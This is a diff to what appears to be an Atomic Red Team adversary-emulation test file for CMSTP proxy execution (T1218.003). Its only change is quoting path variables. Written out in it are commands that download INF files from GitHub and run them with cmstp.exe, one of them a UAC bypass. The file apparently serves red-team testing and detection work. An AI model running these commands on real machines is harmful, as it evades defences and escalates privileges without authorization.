@@ -17,13 +17,13 @@ atomic_tests:
   - description: |
       INF file must exist on disk at specified location (#{inf_file_path})
     prereq_command: |
-      if (Test-Path #{inf_file_path}) {exit 0} else {exit 1}
+      if (Test-Path "#{inf_file_path}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{inf_file_path}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{inf_file_path}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003.inf" -OutFile "#{inf_file_path}"
   executor:
     command: |
-      cmstp.exe /s #{inf_file_path}
+      cmstp.exe /s "#{inf_file_path}"
     name: command_prompt
 - name: CMSTP Executing UAC Bypass
   auto_generated_guid: 748cb4f6-2fb3-4e97-b7ad-b22635a09ab0
@@ -41,11 +41,11 @@ atomic_tests:
   - description: |
       INF file must exist on disk at specified location (#{inf_file_uac})
     prereq_command: |
-      if (Test-Path #{inf_file_uac}) {exit 0} else {exit 1}
+      if (Test-Path "#{inf_file_uac}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{inf_file_uac}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{inf_file_uac}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf" -OutFile "#{inf_file_uac}"
   executor:
     command: |
-      cmstp.exe /s #{inf_file_uac} /au
+      cmstp.exe /s "#{inf_file_uac}" /au
     name: command_prompt
